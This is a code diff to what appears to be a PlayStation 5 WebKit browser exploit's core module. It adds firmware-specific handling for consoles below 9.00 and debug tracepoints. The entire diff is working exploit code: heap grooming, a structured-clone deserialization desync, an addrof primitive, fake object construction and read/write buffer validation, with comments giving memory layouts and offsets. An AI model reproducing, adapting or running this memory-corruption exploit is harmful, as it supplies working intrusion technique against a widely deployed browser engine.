@@ -1,10 +1,65 @@
+// MODULE IDENTITY. core.js holds the entire primitive in module-level `let`s -
+// rwBuffer / targetBuffer / fakeHost / carrierHomeVector. If mem.js imports a different
+// URL than the page does, establishPrimitive() fills one instance while mem.js reads the
+// other, and promotion dies as "mem: bad numeric address NaN" with nothing naming the
+// real cause. Export an object whose IDENTITY can be compared across importers.
+export const CORE_INSTANCE = { url: import.meta.url };
+
+// Sync-XHR tracepoints. Async beacons cannot locate a WebProcess fault (they arrive
+// out of order and the last one before the crash is never sent), so these are
+// deliberately synchronous - but each call BLOCKS. A static host has no log/ endpoint,
+// so ungated they would 404 on every call and stall the timing-sensitive grooming.
+// Off unless ?log=debug is present, which is what the local ps-exploit-host links pass.
+var __TRACE=(function(){try{return /(^|[?&])log=debug(&|$)/.test(location.search);}catch(e){return false;}})();
+function __lowfw(t){if(!__TRACE)return;try{var x=new XMLHttpRequest();x.open("GET","log/LOWFW-"+encodeURIComponent(t),false);x.send();}catch(e){}}
 const DRAIN_COUNT = 512;
+setTimeout(function(){ try{ __lowfw('CONST-K='+K+'-CARRIER='+CARRIER_SLOTS
+  +'-ua='+((navigator.userAgent.match(/PlayStation 5[^)]*?([0-9]+\.[0-9]+)/)||[])[1]||'?')); }catch(e){} },0);
 const AUTO_RETRY_DELAY_MS = 50;
 
-const K = 2;
+// K sets the BigInt/object mix, and therefore how far the deserializer's pool
+// count runs ahead of the serializer's (BigInts pool on the read side only).
+// That divergence is what pushes the ObjectReference index across the 0xFFFF
+// width tier and produces the desync. Measured on a 7.00 devkit:
+//   K=1 -> no desync at all (composition length stays 0x10000)
+//   K=2 -> "Unable to deserialize data" on most attempts
+//   K=3 -> desync fires, length 0x50001, OOB read reached  (also K=5,7,8)
+// 9.00+ is untouched: it keeps K=2, which is what every recorded run there used.
+// Safari 15.4 (PS5 6.00-8.60) vs Safari 17.0 (PS5 9.00+) differ in
+// JSArrayBufferView. Confirmed in WebKit OSS 998553b10918 JSArrayBufferView.h:
+//     VectorPtr      m_vector;   // 8
+//     size_t         m_length;   // 8  <-- size_t on 15.4
+//     TypedArrayMode m_mode;     // uint32
+// so on 15.4 m_mode sits at +0x20, while the 9.00+ code expects it at +0x1c with
+// +0x20 as padding. A 7.00 devkit dumped exactly that: length 0x100 at +0x18 and
+// mode 0x02 (WastefulTypedArray) at +0x20.
+const LOWFW_VIEW = (function () {
+    try {
+        const m = navigator.userAgent.match(/PlayStation 5[^)]*?([0-9]+\.[0-9]+)/);
+        return !!(m && parseFloat(m[1]) < 9.00);
+    } catch (e) { }
+    return false;
+})();
+const K = (function () {
+    try {
+        const m = navigator.userAgent.match(/PlayStation 5[^)]*?([0-9]+\.[0-9]+)/);
+        if (m && parseFloat(m[1]) < 9.00)
+            return 3;
+    } catch (e) { }
+    return 2;
+})();
 const DUPLICATE_INDEX = 2;
 const CONTROL_INDEX = 0xffff;
 const CONTROL_INT = -64000;
+// The desync only lines up on some heap layouts, so a single K makes each attempt
+// roughly a coin flip ("Unable to deserialize data." on the rest). A 7.00 devkit
+// sweep showed K=3,5,7,8 all fire it, so rotate through them across attempts and
+// sample the space rather than re-rolling the same one. 9.00+ keeps a fixed K=2,
+// which is what every recorded run there used.
+const K_CANDIDATES = LOWFW_VIEW ? [3, 5, 7, 8] : [K];
+function currentK() {
+    return K_CANDIDATES[attemptNumber % K_CANDIDATES.length];
+}
 const FILLER_BIGINTS = K - 1;
 const FILLER_OBJECTS = 0xfffe - K;
 const EXPECTED_LENGTH = 0x50001;
@@ -18,11 +73,14 @@ const HOLDER_BYTES = 0x40;
 // storage.  At 9,000,000 slots the corrupted Symbol copy is consistently
 // 924,176 characters.  Reducing it to 2,000,000 changes that copy to a bogus
 // 17,701,392 characters and makes the safe retry exhaust the WebProcess.
-// Overridable so a diagnostic page can sweep the geometry on a firmware whose
-// JSC differs from 9.00's. Absent an override this is exactly 9000000.
-const CARRIER_SLOTS = (typeof globalThis.__slopCarrierSlots === "number"
-    && globalThis.__slopCarrierSlots > 0)
-    ? globalThis.__slopCarrierSlots : 9000000;
+// DO NOT REDUCE. This is exploit geometry, not spare storage. From upstream
+// slopkit-core-final: "At 9,000,000 slots the corrupted Symbol copy is
+// consistently 924,176 characters. Reducing it to 2,000,000 changes that copy
+// to a bogus 17,701,392 characters and makes the safe retry exhaust the
+// WebProcess."  A 7.00 devkit measured exactly 17,701,392 chars with carriers of
+// 0x1000/0x40000/0x100000 slots - i.e. every small-carrier reading taken here was
+// the BOGUS geometry, and the addresses it produced cannot be trusted.
+const CARRIER_SLOTS = 9000000;
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
 const COMPOSE_DELAY_MS = 100;
@@ -144,7 +202,7 @@ const UNSEEN = -1;
 const profile = {
 
     carrierSID: UNSEEN, carrierType: UNSEEN, carrierFlags: UNSEEN,
-    carrierMode: UNSEEN, carrierByte28: UNSEEN, carrierAbvMode: UNSEEN,
+    carrierMode: UNSEEN, carrierByte28: UNSEEN,
     holderSID: UNSEEN, holderType: UNSEEN, holderFlags: UNSEEN,
     functionSID: UNSEEN, functionType: UNSEEN, functionFlags: UNSEEN,
     nativeExecSID: UNSEEN, nativeExecType: UNSEEN, nativeExecFlags: UNSEEN,
@@ -319,18 +377,11 @@ function failed() {
     emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
     stopped = false;
     retryScheduled = false;
-    // Same reasoning as scheduleSafeRetry(): drop the attempt's allocations
-    // before the timer, and give JSC an idle turn to reclaim them. Without
-    // this, a 50ms retry overlaps two carriers (2 x 72MB) plus two copied
-    // strings, and the WebProcess is killed after ~3 attempts. Every binding
-    // released here is re-created by startAttempt() -> resetAttemptState(),
-    // which would have nulled them a moment later anyway.
-    releaseAttemptAllocations();
     setTimeout(() => {
         try { history.replaceState(null, ""); } catch { }
         attemptNumber++;
         startAttempt();
-    }, Math.max(AUTO_RETRY_DELAY_MS, 750));
+    }, AUTO_RETRY_DELAY_MS);
 }
 
 function releaseAttemptAllocations() {
@@ -591,13 +642,17 @@ function buildAndStoreGraph() {
     referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
     buildFakeHost();
 
-    emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
-    fillerGraph = new Array(0xfffd);
+    const kNow = currentK();
+    const fillerBigints = kNow - 1;
+    const fillerObjects = 0xfffe - kNow;
+    emit("SSV-BUILD", `k=${kNow}-n=${DRAIN_COUNT}`);
+__lowfw("LOWFW-C-before-filler-alloc-k=" + kNow);
+        fillerGraph = new Array(0xfffd);
     let pos = 0;
     const huge = 1n << 40n;
-    for (let b = 0; b < FILLER_BIGINTS; ++b)
+    for (let b = 0; b < fillerBigints; ++b)
         fillerGraph[pos++] = huge + BigInt(b);
-    for (let o = 0; o < FILLER_OBJECTS; ++o)
+    for (let o = 0; o < fillerObjects; ++o)
         fillerGraph[pos++] = {};
 
     outerGraph = new Array(CONTROL_INDEX + 1);
@@ -607,25 +662,29 @@ function buildAndStoreGraph() {
     outerGraph[CONTROL_INDEX] = CONTROL_INT;
     emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
 
-    emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
+    emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - kNow).toString(16)}`);
     history.replaceState(outerGraph, "");
     emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
 }
 
 function prepareAddrof() {
-    capturedWords = new Uint16Array(16);
+__lowfw("LOWFW-D-before-addrof-prep");
+        capturedWords = new Uint16Array(16);
     getterCarrier = function getterCarrierFunction() { return 7; };
 
     emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
-    getterCarrier[0] = fakeHost;
+__lowfw("LOWFW-E1-before-carrier-slots=" + CARRIER_SLOTS);
+        getterCarrier[0] = fakeHost;
     for (let i = 1; i < CARRIER_SLOTS; i++)
         getterCarrier[i] = 0;
+__lowfw("LOWFW-E2-carrier-loop-done");
     getterCarrier[1] = targetHolder;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetHolder;
     emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
-
+__lowfw("LOWFW-E3-carrier-done");
     preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+__lowfw("LOWFW-E4-symbol-wrapper-ready");
     emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
 
     setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
@@ -633,15 +692,20 @@ function prepareAddrof() {
 }
 
 function runAddrofCapture() {
+__lowfw("LOWFW-F1-capture-enter");
     try {
+__lowfw("LOWFW-F2-before-symbolToString");
         capturedString = symbolToString.call(preparedSymbolObject);
         copiedLength = capturedString.length;
+__lowfw("LOWFW-F3-string-len=" + copiedLength);
         for (let i = 0; i < 16; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
+__lowfw("LOWFW-F4-words-read");
         captureState = 1;
     } catch (error) {
         captureError = error;
         captureState = -1;
+__lowfw("LOWFW-F5-capture-threw-" + String(error && error.message).slice(0, 40));
     }
 }
 
@@ -716,37 +780,19 @@ function loadHistoryCritical() {
         const rwLength = uint32At(rwHeader, 0x18);
         rwOriginalVector = low48At(rwHeader, 0x10);
 
-        // JSArrayBufferView's tail is NOT the same shape in the two JSC
-        // versions this engine has to cover (both confirmed against Sony's
-        // published sources):
-        //
-        //   JSC 613 (7.00):  +0x18 size_t m_length
-        //                    +0x20 uint32 m_mode           sizeof 0x28
-        //   JSC 616 (9.00+): +0x18 size_t m_length
-        //                    +0x20 size_t m_byteOffset
-        //                    +0x28 uint8  m_mode           sizeof 0x30
-        //
-        // So "bytes 0x20..0x27 are zero" is m_byteOffset == 0 on 616 -- a real
-        // assertion that the view starts at the head of its buffer. On 613 the
-        // very same bytes are m_mode, and the carrier is built as
-        // `new Uint8Array(new ArrayBuffer(0x100))`, i.e. WastefulTypedArray (2),
-        // so it can never read zero there. Profiles that declare the 613 layout
-        // get the equivalent assertion against m_mode rather than a weaker one.
-        const abvModeAt20 = typeof OFFSET_jsc_abv_mode_at_0x20 !== "undefined"
-            && OFFSET_jsc_abv_mode_at_0x20 === true;
-        const rwOffsetZero = allZero(rwHeader, 0x20, 0x28);
-        const rwTailOK = abvModeAt20
-            ? (uint32At(rwHeader, 0x20) === 2 && allZero(rwHeader, 0x24, 0x28))
-            : rwOffsetZero;
+        // 15.4: +0x20 holds m_mode (uint32), so only +0x24..+0x27 is padding.
+        // 9.00+: m_mode is at +0x1c and +0x20..+0x27 really is padding.
+        const rwOffsetZero = LOWFW_VIEW
+            ? (rwHeader[0x20] <= 3 && rwHeader[0x21] === 0
+               && rwHeader[0x22] === 0 && rwHeader[0x23] === 0
+               && allZero(rwHeader, 0x24, 0x28))
+            : allZero(rwHeader, 0x20, 0x28);
 
         profile.carrierSID = rwSID;
         profile.carrierType = rwHeader[5];
         profile.carrierFlags = rwHeader[6];
-        profile.carrierMode = rwHeader[0x1c];
+        profile.carrierMode = LOWFW_VIEW ? rwHeader[0x20] : rwHeader[0x1c];
         profile.carrierByte28 = rwHeader[0x28];
-        // the real m_mode, wherever this JSC keeps it
-        profile.carrierAbvMode = abvModeAt20
-            ? uint32At(rwHeader, 0x20) : rwHeader[0x28];
 
         rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000
             && rwHeader[4] === 0
@@ -758,7 +804,7 @@ function loadHistoryCritical() {
             && rwLength === RW_BUFFER_SIZE
             && rwHeader[0x1d] === 0
             && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
-            && rwTailOK;
+            && rwOffsetZero;
 
         if (!rwHeaderOK) {
             zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
@@ -980,6 +1026,7 @@ function loadHistoryCritical() {
 function runGroomAndLoad() {
     try {
         emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
+__lowfw("LOWFW-H1-groom-enter-drain=" + DRAIN_COUNT + "x" + DRAIN_SIZE);
         const channel = new MessageChannel();
         channel.port1.close();
         channel.port2.close();
@@ -987,10 +1034,12 @@ function runGroomAndLoad() {
         for (let i = 0; i < DRAIN_COUNT; ++i)
             keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
 
+__lowfw("LOWFW-H2-drain-done");
         let slab = buffer(SLAB_SIZE);
         channel.port1.postMessage(0, [slab]);
         slab = null;
 
+__lowfw("LOWFW-H3-slab-transferred");
         const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
         const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
         const separator = buffer(SEPARATOR_SIZE);
@@ -999,7 +1048,9 @@ function runGroomAndLoad() {
         const predecessor = buffer(PREDECESSOR_SIZE);
         const finalHole = buffer(FINAL_HOLE_SIZE);
 
+__lowfw("LOWFW-H4-holes-allocated");
         fillRawCellPointers(predecessor, fakeAddress);
+__lowfw("LOWFW-H5-predecessor-filled");
         keepAlive[keepIndex++] = separator;
         keepAlive[keepIndex++] = guard;
         keepAlive[keepIndex++] = predecessor;
@@ -1007,15 +1058,19 @@ function runGroomAndLoad() {
             + `-fake=${hex(fakeAddress)}`);
 
         criticalBarrier(fakeAddress, targetAddress);
+__lowfw("LOWFW-H6-barrier-done");
 
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
+__lowfw("LOWFW-H7-holes-transferred");
         loadHistoryCritical();
+__lowfw("LOWFW-H8-load-returned-state=" + compositionState + "-len=" + compositionLength + "-k=" + currentK());
     } catch (error) {
         try { clearPredecessor(); } catch {}
         retrySafe = true;
         compositionError = error;
         compositionState = -1;
+__lowfw("LOWFW-H9-groom-threw-" + String(error && error.message).slice(0, 60));
     }
     reportComposition();
 }
@@ -1046,6 +1101,7 @@ function defaultCriticalBarrier(fake, target) {
 }
 
 function beginComposition() {
+__lowfw("LOWFW-G1-compose-enter-captureState=" + captureState);
     if (captureState === 0) {
         finishEarlySafeAttempt("ADDROF-NO-RESULT",
             "capture-task-did-not-finish", "addrof-no-result");
@@ -1063,6 +1119,7 @@ function beginComposition() {
     const b0 = pointerFromWords(capturedWords, 4);
     const a1 = pointerFromWords(capturedWords, 8);
     const b1 = pointerFromWords(capturedWords, 12);
+__lowfw("LOWFW-G2-a0=" + (a0>>>0).toString(16) + "-b0=" + (b0>>>0).toString(16));
     const repeated = a0 === a1 && b0 === b1;
     const distinct = a0 !== b0;
     const plausible = plausibleCell(a0) && plausibleCell(b0)
@@ -1096,6 +1153,7 @@ function beginComposition() {
         return;
     }
 
+__lowfw("LOWFW-G3-addrof-validated");
     fakeAddress = hostAddress + 0x10;
     if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
         finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",
@@ -1104,11 +1162,13 @@ function beginComposition() {
     }
     emit("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}`
         + "-delta=0x10");
+__lowfw("LOWFW-G4-before-groom-and-load");
     runGroomAndLoad();
 }
 
 function reportComposition() {
     if (compositionState < 0) {
+        try { __lowfw("LOWFW-J1-load-threw-" + String(compositionError && compositionError.message).slice(0, 70)); } catch (e) { }
         emit(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
             `${compositionError?.name}:`
             + String(compositionError?.message).slice(0, 80));
@@ -1120,12 +1180,23 @@ function reportComposition() {
     }
 
     if (compositionState === 2) {
+        try { __lowfw("LOWFW-J2-normal-clone-miss"); } catch (e) { }
         emit("NORMAL-CLONE-MISS", "known-reference-returned=true");
         scheduleSafeRetry("normal-clone-miss");
         return;
     }
 
     if (compositionState === 3) {
+        try {
+            __lowfw("LOWFW-J3-" + (identityResult === -1 ? "CARRIER-IDENTITY-FAIL"
+                : (zeroHeaderMiss ? "ZERO-HEADER-MISS"
+                    : (retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH")))
+                + "-rw=" + rwHeaderOK + "-holder=" + holderHeaderOK
+                + "-fn=" + functionHeaderOK + "-nx=" + nativeExecutableHeaderOK
+                + "-rep=" + pointersRepeated + "-ident=" + identityResult
+                + "-len=" + compositionLength);
+            __lowfw("LOWFW-J3HEX-" + String(dumpHex(rwHeader, CELL_BYTES)).slice(0, 96));
+        } catch (e) { __lowfw("LOWFW-J3-report-threw"); }
         emit(identityResult === -1 ? "CARRIER-IDENTITY-FAIL"
             : (zeroHeaderMiss ? "ZERO-HEADER-MISS"
                 : (retrySafe ? "COMPOSITION-LENGTH-MISS"
